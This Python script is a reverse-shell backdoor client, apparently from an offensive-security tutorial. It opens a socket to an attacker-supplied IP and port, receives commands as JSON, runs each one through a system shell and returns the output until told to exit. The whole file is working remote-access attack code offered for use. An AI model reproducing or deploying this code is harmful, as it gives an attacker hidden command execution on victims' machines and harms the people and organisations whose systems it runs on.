#!/usr/bin/env python

import socket, subprocess, json, sys

class Connector:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        self.connection.send(json.dumps(data, encoding=sys.stdout.encoding))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1380)
                return json.loads(json_data, encoding=sys.stdout.encoding)
            except ValueError:
                continue

    def run(self):
        while True:
            print("ON")
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            command_result = subprocess.check_output(command, shell=True)
            self.reliable_send(command_result)
